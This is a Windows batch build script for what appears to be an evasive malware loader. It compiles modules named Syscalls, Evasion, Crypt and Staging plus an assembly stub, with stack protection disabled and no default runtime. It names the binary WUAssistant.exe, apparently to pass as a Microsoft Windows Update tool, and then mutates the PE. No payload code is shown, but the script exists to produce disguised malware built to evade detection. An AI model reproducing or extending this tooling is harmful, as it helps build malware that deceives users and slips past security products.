@echo off
REM =============================================
REM  build.bat
REM =============================================

SET "VSTOOLS="
IF EXIST "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat" (
    SET "VSTOOLS=C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
)
IF EXIST "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" (
    SET "VSTOOLS=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
)
IF "%VSTOOLS%"=="" ( echo [!] VS not found. & exit /b 1 )
call "%VSTOOLS%" >nul 2>&1

SET OUTNAME=WUAssistant.exe
SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c
SET CFLAGS=/O1 /GS- /W0 /std:c17 /nologo
SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS kernel32.lib user32.lib

echo [*] Assembling...
ml64 /c /nologo AsmStub.asm >nul
IF %ERRORLEVEL% NEQ 0 ( echo [!] ASM failed & exit /b 1 )

echo [*] Compiling...
cl %CFLAGS% %CFILES% AsmStub.obj /Fe:%OUTNAME% /link %LFLAGS%
IF %ERRORLEVEL% NEQ 0 ( echo [!] Build failed & exit /b 1 )

echo [*] Mutating PE...
python Mutate.py %OUTNAME%

echo.
echo [+] Build: %OUTNAME%
for %%A in (%OUTNAME%) do echo [*] Size: %%~zA bytes
del /Q *.obj *.exp *.lib *.res 2>nul
echo [+] Done!
